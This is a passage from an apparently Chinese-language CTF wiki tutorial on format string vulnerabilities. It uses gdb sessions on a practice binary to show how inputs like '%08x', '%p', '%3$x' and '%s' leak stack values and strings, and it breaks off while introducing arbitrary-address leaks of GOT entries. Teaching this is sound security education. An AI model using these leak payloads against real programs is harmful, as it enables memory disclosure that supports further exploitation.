/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory \n%08x.%08x.%08x\n\n\n\n\n\u6b64\u65f6\uff0c\u7a0b\u5e8f\u7b49\u5f85\u6211\u4eec\u7684\u8f93\u5165\uff0c\u8fd9\u65f6\u6211\u4eec\u8f93\u5165%08x.%08x.%08x\uff0c\u7136\u540e\u6572\u51fb\u56de\u8f66\uff0c\u662f\u7a0b\u5e8f\u7ee7\u7eed\u8fd0\u884c\uff0c\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u9996\u5148\u65ad\u5728\u4e86\u7b2c\u4e00\u6b21\u8c03\u7528printf\u51fd\u6570\u7684\u4f4d\u7f6e\n\n\nBreakpoint \n1\n, __printf \n(\nformat\n=\n0x8048563 \n%08x.%08x.%08x.%s\\n\n)\n at printf.c:28\n\n28\n  printf.c: \u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55.\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n code:i386 \n]\n\u2500\u2500\u2500\u2500\n   0xf7e44667 \nfprintf+23\n     inc    DWORD PTR \n[\nebx+0x66c31cc4\n]\n\n   0xf7e4466d                  nop    \n   0xf7e4466e                  xchg   ax, ax\n \u2192 0xf7e44670 \nprintf+0\n       call   0xf7f1ab09 \n__x86.get_pc_thunk.ax\n\n   \u21b3  0xf7f1ab09 \n__x86.get_pc_thunk.ax+0\n mov    eax, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab0c \n__x86.get_pc_thunk.ax+3\n ret    \n      0xf7f1ab0d \n__x86.get_pc_thunk.dx+0\n mov    edx, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab10 \n__x86.get_pc_thunk.dx+3\n ret    \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n stack \n]\n\u2500\u2500\u2500\u2500\n\n[\n0xffffccec\n, \nl8\n]\n\n\n8\n\n0xffffccec\u2502+0x00: 0x080484bf  \u2192  \nmain+84\n add esp, 0x20     \u2190 \n$esp\n\n0xffffccf0\u2502+0x04: 0x08048563  \u2192  \n%08x.%08x.%08x.%s\n\n0xffffccf4\u2502+0x08: 0x00000001\n0xffffccf8\u2502+0x0c: 0x22222222\n0xffffccfc\u2502+0x10: 0xffffffff\n0xffffcd00\u2502+0x14: 0xffffcd10  \u2192  \n%08x.%08x.%08x\n\n0xffffcd04\u2502+0x18: 0xffffcd10  \u2192  \n%08x.%08x.%08x\n\n0xffffcd08\u2502+0x1c: 0x000000c2\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u6b64\u65f6\u6b64\u65f6\u5df2\u7ecf\u8fdb\u5165\u4e86printf\u51fd\u6570\u4e2d\uff0c\u6808\u4e2d\u7b2c\u4e00\u4e2a\u53d8\u91cf\u4e3a\u8fd4\u56de\u5730\u5740\uff0c\u7b2c\u4e8c\u4e2a\u53d8\u91cf\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5730\u5740\uff0c\u7b2c\u4e09\u4e2a\u53d8\u91cf\u4e3aa\u7684\u503c\uff0c\u7b2c\u56db\u4e2a\u53d8\u91cf\u4e3ab\u7684\u503c\uff0c\u7b2c\u4e94\u4e2a\u53d8\u91cf\u4e3ac\u7684\u503c\uff0c\u7b2c\u516d\u4e2a\u53d8\u91cf\u4e3a\u6211\u4eec\u8f93\u5165\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5bf9\u5e94\u7684\u5730\u5740\u3002\u7ee7\u7eed\u8fd0\u884c\u7a0b\u5e8f\n\n\ngef\u27a4  c\nContinuing.\n\n00000001\n.22222222.ffffffff.%08x.%08x.%08x\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u786e\u5b9e\u8f93\u51fa\u4e86\u6bcf\u4e00\u4e2a\u53d8\u91cf\u5bf9\u5e94\u7684\u6570\u503c\uff0c\u5e76\u4e14\u65ad\u5728\u4e86\u4e0b\u4e00\u4e2aprintf\u5904\n\n\nBreakpoint \n1\n, __printf \n(\nformat\n=\n0xffffcd10 \n%08x.%08x.%08x\n)\n at printf.c:28\n\n28\n  in printf.c\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n code:i386 \n]\n\u2500\u2500\u2500\u2500\n   0xf7e44667 \nfprintf+23\n     inc    DWORD PTR \n[\nebx+0x66c31cc4\n]\n\n   0xf7e4466d                  nop    \n   0xf7e4466e                  xchg   ax, ax\n \u2192 0xf7e44670 \nprintf+0\n       call   0xf7f1ab09 \n__x86.get_pc_thunk.ax\n\n   \u21b3  0xf7f1ab09 \n__x86.get_pc_thunk.ax+0\n mov    eax, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab0c \n__x86.get_pc_thunk.ax+3\n ret    \n      0xf7f1ab0d \n__x86.get_pc_thunk.dx+0\n mov    edx, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab10 \n__x86.get_pc_thunk.dx+3\n ret    \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n stack \n]\n\u2500\u2500\u2500\u2500\n\n[\n0xffffccfc\n, \nl8\n]\n\n\n8\n\n0xffffccfc\u2502+0x00: 0x080484ce  \u2192  \nmain+99\n add esp, 0x10     \u2190 \n$esp\n\n0xffffcd00\u2502+0x04: 0xffffcd10  \u2192  \n%08x.%08x.%08x\n\n0xffffcd04\u2502+0x08: 0xffffcd10  \u2192  \n%08x.%08x.%08x\n\n0xffffcd08\u2502+0x0c: 0x000000c2\n0xffffcd0c\u2502+0x10: 0xf7e8b6bb  \u2192  \nhandle_intel+107\n add esp, 0x10\n0xffffcd10\u2502+0x14: \n%08x.%08x.%08x\n   \u2190 \n$eax\n\n0xffffcd14\u2502+0x18: \n.%08x.%08x\n\n0xffffcd18\u2502+0x1c: \nx.%08x\n\n\n\n\n\n\u6b64\u65f6\uff0c\u7531\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e3a%x%x%x\uff0c\u6240\u4ee5\uff0c\u7a0b\u5e8f \u4f1a\u5c06\u6808\u4e0a\u76840xffffcd04\u53ca\u5176\u4e4b\u540e\u7684\u6570\u503c\u5206\u522b\u4f5c\u4e3a\u7b2c\u4e00\uff0c\u7b2c\u4e8c\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570\u6309\u7167int\u578b\u8fdb\u884c\u89e3\u6790\uff0c\u5206\u522b\u8f93\u51fa\u3002\u7ee7\u7eed\u8fd0\u884c\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u5982\u4e0b\u7ed3\u679c\u53bb\uff0c\u786e\u5b9e\u548c\u60f3\u8c61\u4e2d\u7684\u4e00\u6837\u3002\n\n\ngef\u27a4  c\nContinuing.\nffffcd10.000000c2.f7e8b6bb\n[\nInferior \n1\n \n(\nprocess \n57077\n)\n exited normally\n]\n\n\n\n\n\n\u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u4f7f\u7528%p\u6765\u83b7\u53d6\u6570\u636e\uff0c\u5982\u4e0b\n\n\n%\np\n.%\np\n.%\np\n\n\n00000001.22222222\n.\nffffffff\n.%\np\n.%\np\n.%\np\n\n\n0xfff328c0\n.\n0xc2\n.\n0xf75c46bb\n%\n    \n\n\n\n\n\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5e76\u4e0d\u662f\u6bcf\u6b21\u5f97\u5230\u7684\u7ed3\u679c\u90fd\u4e00\u6837 \uff0c\u56e0\u4e3a\u6808\u4e0a\u7684\u6570\u636e\u4f1a\u56e0\u4e3a\u6bcf\u6b21\u5206\u914d\u7684\u5185\u5b58\u9875\u4e0d\u540c\u800c\u6709\u6240\u4e0d\u540c\uff0c\u8fd9\u662f\u56e0\u4e3a\u6808\u662f\u4e0d\u5bf9\u5185\u5b58\u9875\u505a\u521d\u59cb\u5316\u7684\u3002\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u4e0a\u9762\u7ed9\u51fa\u7684\u65b9\u6cd5\uff0c\u90fd\u662f\u4f9d\u6b21\u83b7\u5f97\u6808\u4e2d\u7684\u6bcf\u4e2a\u53c2\u6570\uff0c\u6211\u4eec\u6709\u6ca1\u6709\u529e\u6cd5\u76f4\u63a5\u83b7\u53d6\u6808\u4e2d\u88ab\u89c6\u4e3a\u7b2cn+1\u4e2a\u53c2\u6570\u7684\u503c\u5462\n\uff1f\u80af\u5b9a\u662f\u53ef\u4ee5\u7684\u5566\u3002\u65b9\u6cd5\u5982\u4e0b\n\n\n%n$x\n\n\n\n\n\u5229\u7528\u5982\u4e0b\u7684\u5b57\u7b26\u4e32\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u53d6\u5230\u5bf9\u5e94\u7684\u7b2cn+1\u4e2a\u53c2\u6570\u7684\u6570\u503c\u3002\u4e3a\u4ec0\u4e48\u8fd9\u91cc\u8981\u8bf4\u662f\u5bf9\u5e94\u7b2cn+1\u4e2a\u53c2\u6570\u5462\uff1f\u8fd9\u662f\u56e0\u4e3a\u683c\u5f0f\u5316\u53c2\u6570\u91cc\u9762\u7684n\u6307\u7684\u662f\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5bf9\u5e94\u7684\u7b2cn\u4e2a\u8f93\u51fa\u53c2\u6570\uff0c\u90a3\u76f8\u5bf9\u4e8e\u8f93\u51fa\u51fd\u6570\u6765\u8bf4\uff0c\u5c31\u662f\u7b2cn+1\u4e2a\u53c2\u6570\u4e86\u3002\n\n\n\u8fd9\u91cc\u6211\u4eec\u518d\u6b21\u4ee5gdb\u8c03\u8bd5\u4e00\u4e0b\u3002\n\n\n\u279c  leakmemory git:\n(\nmaster\n)\n \u2717 gdb leakmemory\ngef\u27a4  b \nprintf\n\nBreakpoint \n1\n at 0x8048330\ngef\u27a4  r\nStarting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory \n%3\n$x\n\n\nBreakpoint \n1\n, __printf \n(\nformat\n=\n0x8048563 \n%08x.%08x.%08x.%s\\n\n)\n at printf.c:28\n\n28\n  printf.c: \u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55.\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n code:i386 \n]\n\u2500\u2500\u2500\u2500\n   0xf7e44667 \nfprintf+23\n     inc    DWORD PTR \n[\nebx+0x66c31cc4\n]\n\n   0xf7e4466d                  nop    \n   0xf7e4466e                  xchg   ax, ax\n \u2192 0xf7e44670 \nprintf+0\n       call   0xf7f1ab09 \n__x86.get_pc_thunk.ax\n\n   \u21b3  0xf7f1ab09 \n__x86.get_pc_thunk.ax+0\n mov    eax, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab0c \n__x86.get_pc_thunk.ax+3\n ret    \n      0xf7f1ab0d \n__x86.get_pc_thunk.dx+0\n mov    edx, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab10 \n__x86.get_pc_thunk.dx+3\n ret    \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n stack \n]\n\u2500\u2500\u2500\u2500\n\n[\n0xffffccec\n, \nl8\n]\n\n\n8\n\n0xffffccec\u2502+0x00: 0x080484bf  \u2192  \nmain+84\n add esp, 0x20     \u2190 \n$esp\n\n0xffffccf0\u2502+0x04: 0x08048563  \u2192  \n%08x.%08x.%08x.%s\n\n0xffffccf4\u2502+0x08: 0x00000001\n0xffffccf8\u2502+0x0c: 0x22222222\n0xffffccfc\u2502+0x10: 0xffffffff\n0xffffcd00\u2502+0x14: 0xffffcd10  \u2192  \n%3\n$x\n\n0xffffcd04\u2502+0x18: 0xffffcd10  \u2192  \n%3\n$x\n\n0xffffcd08\u2502+0x1c: 0x000000c2\ngef\u27a4  c\nContinuing.\n\n00000001\n.22222222.ffffffff.%3\n$x\n\n\nBreakpoint \n1\n, __printf \n(\nformat\n=\n0xffffcd10 \n%3\n$x\n)\n at printf.c:28\n\n28\n  in printf.c\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n code:i386 \n]\n\u2500\u2500\u2500\u2500\n   0xf7e44667 \nfprintf+23\n     inc    DWORD PTR \n[\nebx+0x66c31cc4\n]\n\n   0xf7e4466d                  nop    \n   0xf7e4466e                  xchg   ax, ax\n \u2192 0xf7e44670 \nprintf+0\n       call   0xf7f1ab09 \n__x86.get_pc_thunk.ax\n\n   \u21b3  0xf7f1ab09 \n__x86.get_pc_thunk.ax+0\n mov    eax, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab0c \n__x86.get_pc_thunk.ax+3\n ret    \n      0xf7f1ab0d \n__x86.get_pc_thunk.dx+0\n mov    edx, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab10 \n__x86.get_pc_thunk.dx+3\n ret    \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n stack \n]\n\u2500\u2500\u2500\u2500\n\n[\n0xffffccfc\n, \nl8\n]\n\n\n8\n\n0xffffccfc\u2502+0x00: 0x080484ce  \u2192  \nmain+99\n add esp, 0x10     \u2190 \n$esp\n\n0xffffcd00\u2502+0x04: 0xffffcd10  \u2192  \n%3\n$x\n\n0xffffcd04\u2502+0x08: 0xffffcd10  \u2192  \n%3\n$x\n\n0xffffcd08\u2502+0x0c: 0x000000c2\n0xffffcd0c\u2502+0x10: 0xf7e8b6bb  \u2192  \nhandle_intel+107\n add esp, 0x10\n0xffffcd10\u2502+0x14: \n%3\n$x\n     \u2190 \n$eax\n\n0xffffcd14\u2502+0x18: 0xffffce00  \u2192  0x00000001\n0xffffcd18\u2502+0x1c: 0x000000e0\ngef\u27a4  c\nContinuing.\nf7e8b6bb\n[\nInferior \n1\n \n(\nprocess \n57442\n)\n exited normally\n]\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u786e\u5b9e\u83b7\u5f97\u4e86printf\u7684\u7b2c4\u4e2a\u53c2\u6570\u6240\u5bf9\u5e94\u7684\u503cf7e8b6bb\u3002\n\n\n\u83b7\u53d6\u6808\u53d8\u91cf\u5bf9\u5e94\u5b57\u7b26\u4e32\n\n\n\u6b64\u5916\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u83b7\u5f97\u6808\u53d8\u91cf\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\uff0c\u8fd9\u5176\u5b9e\u5c31\u662f\u9700\u8981\u7528\u5230%s\u4e86\u3002\u8fd9\u91cc\u8fd8\u662f\u4f7f\u7528\u4e0a\u9762\u7684\u7a0b\u5e8f\uff0c\u8fdb\u884cgdb\u8c03\u8bd5\uff0c\u5982\u4e0b\n\n\n\u279c  leakmemory git:\n(\nmaster\n)\n \u2717 gdb leakmemory\ngef\u27a4  b \nprintf\n\nBreakpoint \n1\n at 0x8048330\ngef\u27a4  r\nStarting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory \n%s\n\nBreakpoint \n1\n, __printf \n(\nformat\n=\n0x8048563 \n%08x.%08x.%08x.%s\\n\n)\n at printf.c:28\n\n28\n  printf.c: \u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55.\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n code:i386 \n]\n\u2500\u2500\u2500\u2500\n   0xf7e44667 \nfprintf+23\n     inc    DWORD PTR \n[\nebx+0x66c31cc4\n]\n\n   0xf7e4466d                  nop    \n   0xf7e4466e                  xchg   ax, ax\n \u2192 0xf7e44670 \nprintf+0\n       call   0xf7f1ab09 \n__x86.get_pc_thunk.ax\n\n   \u21b3  0xf7f1ab09 \n__x86.get_pc_thunk.ax+0\n mov    eax, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab0c \n__x86.get_pc_thunk.ax+3\n ret    \n      0xf7f1ab0d \n__x86.get_pc_thunk.dx+0\n mov    edx, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab10 \n__x86.get_pc_thunk.dx+3\n ret    \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n stack \n]\n\u2500\u2500\u2500\u2500\n\n[\n0xffffccec\n, \nl8\n]\n\n\n8\n\n0xffffccec\u2502+0x00: 0x080484bf  \u2192  \nmain+84\n add esp, 0x20     \u2190 \n$esp\n\n0xffffccf0\u2502+0x04: 0x08048563  \u2192  \n%08x.%08x.%08x.%s\n\n0xffffccf4\u2502+0x08: 0x00000001\n0xffffccf8\u2502+0x0c: 0x22222222\n0xffffccfc\u2502+0x10: 0xffffffff\n0xffffcd00\u2502+0x14: 0xffffcd10  \u2192  0xff007325 \n(\n%s\n?\n)\n\n0xffffcd04\u2502+0x18: 0xffffcd10  \u2192  0xff007325 \n(\n%s\n?\n)\n\n0xffffcd08\u2502+0x1c: 0x000000c2\ngef\u27a4  c\nContinuing.\n\n00000001\n.22222222.ffffffff.%s\n\nBreakpoint \n1\n, __printf \n(\nformat\n=\n0xffffcd10 \n%s\n)\n at printf.c:28\n\n28\n  in printf.c\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n code:i386 \n]\n\u2500\u2500\u2500\u2500\n   0xf7e44667 \nfprintf+23\n     inc    DWORD PTR \n[\nebx+0x66c31cc4\n]\n\n   0xf7e4466d                  nop    \n   0xf7e4466e                  xchg   ax, ax\n \u2192 0xf7e44670 \nprintf+0\n       call   0xf7f1ab09 \n__x86.get_pc_thunk.ax\n\n   \u21b3  0xf7f1ab09 \n__x86.get_pc_thunk.ax+0\n mov    eax, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab0c \n__x86.get_pc_thunk.ax+3\n ret    \n      0xf7f1ab0d \n__x86.get_pc_thunk.dx+0\n mov    edx, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab10 \n__x86.get_pc_thunk.dx+3\n ret    \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n stack \n]\n\u2500\u2500\u2500\u2500\n\n[\n0xffffccfc\n, \nl8\n]\n\n\n8\n\n0xffffccfc\u2502+0x00: 0x080484ce  \u2192  \nmain+99\n add esp, 0x10     \u2190 \n$esp\n\n0xffffcd00\u2502+0x04: 0xffffcd10  \u2192  0xff007325 \n(\n%s\n?\n)\n\n0xffffcd04\u2502+0x08: 0xffffcd10  \u2192  0xff007325 \n(\n%s\n?\n)\n\n0xffffcd08\u2502+0x0c: 0x000000c2\n0xffffcd0c\u2502+0x10: 0xf7e8b6bb  \u2192  \nhandle_intel+107\n add esp, 0x10\n0xffffcd10\u2502+0x14: 0xff007325 \n(\n%s\n?\n)\n     \u2190 \n$eax\n\n0xffffcd14\u2502+0x18: 0xffffce3c  \u2192  0xffffd074  \u2192  \nXDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]\n\n0xffffcd18\u2502+0x1c: 0x000000e0\ngef\u27a4  c\nContinuing.\n%s\n[\nInferior \n1\n \n(\nprocess \n57488\n)\n exited normally\n]\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u5728\u7b2c\u4e8c\u6b21\u6267\u884cprintf\u51fd\u6570\u7684\u65f6\u5019\uff0c\u786e\u5b9e\u662f\u5c060xffffcd04\u5904\u7684\u53d8\u91cf\u89c6\u4e3a\u5b57\u7b26\u4e32\u53d8\u91cf\uff0c\u8f93\u51fa\u4e86\u5176\u6570\u503c\u6240\u5bf9\u5e94\u7684\u5730\u5740\u5904\u7684\u5b57\u7b26\u4e32\u3002\n\n\n\u5f53\u7136\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u8fd9\u6837\u7684\u90fd\u4f1a\u6b63\u5e38\u8fd0\u884c\uff0c\u5982\u679c\u5bf9\u5e94\u7684\u53d8\u91cf\u4e0d\u80fd\u591f\u88ab\u89e3\u6790\u4e3a\u5b57\u7b26\u4e32\u5730\u5740\uff0c\u90a3\u4e48\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u76f4\u63a5\u5d29\u6e83\u3002\n\n\n\u6b64\u5916\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u6307\u5b9a\u83b7\u53d6\u6808\u4e0a\u7b2c\u51e0\u4e2a\u53c2\u6570\u4f5c\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u8f93\u51fa\uff0c\u6bd4\u5982\u6211\u4eec\u6307\u5b9a\u7b2cprintf\u7684\u7b2c3\u4e2a\u53c2\u6570\uff0c\u5982\u4e0b\uff0c\u6b64\u65f6\u7a0b\u5e8f\u5c31\u4e0d\u80fd\u591f\u89e3\u6790\uff0c\u5c31\u5d29\u6e83\u4e86\u3002\n\n\n\u279c  leakmemory git:\n(\nmaster\n)\n \u2717 ./leakmemory\n%2\n$s\n\n\n00000001\n.22222222.ffffffff.%2\n$s\n\n\n[\n1\n]\n    \n57534\n segmentation fault \n(\ncore dumped\n)\n  ./leakmemory\n\n\n\n\n\u5c0f\u6280\u5de7\u603b\u7ed3\n\n\n\n\n\n\n\u5229\u7528%x\u6765\u83b7\u53d6\u5bf9\u5e94\u6808\u7684\u5185\u5b58\uff0c\u4f46\u5efa\u8bae\u4f7f\u7528%p\uff0c\u53ef\u4ee5\u4e0d\u7528\u8003\u8651\u4f4d\u6570\u7684\u533a\u522b\u3002\n\n\n\u5229\u7528%s\u6765\u83b7\u53d6\u53d8\u91cf\u6240\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\uff0c\u53ea\u4e0d\u8fc7\u6709\u96f6\u622a\u65ad\u3002\n\n\n\u5229\u7528%order\nx\u6765\u83b7\u53d6\u6307\u5b9a\u53c2\u6570\u7684\u503c\uff0c\u5229\u7528%order\\\nx\u6765\u83b7\u53d6\u6307\u5b9a\u53c2\u6570\u7684\u503c\uff0c\u5229\u7528%order\\\ns\u6765\u83b7\u53d6\u6307\u5b9a\u53c2\u6570\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\u3002\n\n\n\n\n\n\n\u6cc4\u9732\u4efb\u610f\u5730\u5740\u5185\u5b58\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u5728\u4e0a\u9762\u65e0\u8bba\u662f\u6cc4\u9732\u6808\u4e0a\u8fde\u7eed\u7684\u53d8\u91cf\uff0c\u8fd8\u662f\u8bf4\u6cc4\u9732\u6307\u5b9a\u7684\u53d8\u91cf\u503c\uff0c\u6211\u4eec\u90fd\u6ca1\u80fd\u5b8c\u5168\u63a7\u5236\u6211\u4eec\u6240\u8981\u6cc4\u9732\u7684\u53d8\u91cf\u7684\u5730\u5740\u3002\u8fd9\u6837\u7684\u6cc4\u9732\u56fa\u7136\u6709\u7528\uff0c\u53ef\u662f\u5374\u4e0d\u591f\u5f3a\u529b\u6709\u6548\u3002\u6709\u65f6\u5019\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u60f3\u8981\u6cc4\u9732\u67d0\u4e00\u4e2alibc\u51fd\u6570\u7684got\u8868\u5185\u5bb9\uff0c\u4ece\u800c\u5f97\u5230\u5176\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6libc\u7248\u672c\u4ee5\u53ca\u5176\u4ed6\u51fd\u6570\u7684\u5730\u5740\uff0c\u8fd9\u65f6\u5019\uff0c\u80fd\u591f\u5b8c\u5168\u63a7\u5236\u6cc4\u9732\u67d0\u4e2a\u6307\u5b9a\u5730\u5740\u7684\u5185\u5b58\u5c31\u663e\u5f97\u5f88\u91cd\u8981\u4e86\u3002\u90a3\u4e48\u6211\u4eec\u7a76\u7adf\u80fd\u4e0d\u80fd\u8fd9\u6837\u505a\u5462\uff1f\u81ea\u7136\u4e5f\u662f\u53ef\u4ee5\u7684\u5566\u3002\n\n\n\u6211\u4eec\u518d\u4ed4\u7ec6\u56de\u60f3\u4e00\u4e0b\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4e2d\uff0c\u6211\u4eec\u6240\u8bfb\u53d6\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u90fd\u662f\u5728\u6808\u4e0a\u7684\u3002\u90a3\u4e48\u4e5f\u5c31\u662f\u8bf4\uff0c\u5728\u8c03\u7528\u8f93\u51fa\u51fd\u6570\u7684\u65f6\u5019\uff0c\u5176\u5b9e\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u7684\u503c\u5176\u5b9e\u5c31\u662f\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5730\u5740\u3002\u6211\u4eec\u9009\u62e9\u4e0a\u9762\u7684\u67d0\u4e2a\u51fd\u6570\u8c03\u7528\u4e3a\u4f8b\n\n\nBreakpoint \n1\n, __printf \n(\nformat\n=\n0xffffcd10 \n%s\n)\n at printf.c:28\n\n28\n  in 